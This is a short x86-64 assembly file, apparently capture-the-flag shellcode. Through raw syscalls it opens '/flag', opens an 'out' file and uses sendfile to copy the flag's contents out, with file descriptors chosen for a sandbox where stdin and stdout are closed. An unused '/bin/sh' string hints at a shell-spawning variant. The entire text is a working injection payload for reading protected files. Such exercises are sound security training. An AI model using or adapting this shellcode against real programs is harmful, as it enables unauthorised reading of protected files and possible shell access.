.global _start
_start:
.intel_syntax noprefix

# open("/flag", 0) // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall

# open("out", 1) // 1 is O_WRONLY
mov rax, 2
lea rdi, [rip+out]
mov rsi, 1
syscall

# sendfile(1, 0, 0, 0x80);
mov rax, 40
mov rdi, 1
mov rsi, 0
mov rdx, 0
mov r10, 0x80
syscall

out:
.asciz "out"
flag:
.asciz "/flag"
binsh:
.asciz "/bin/sh"
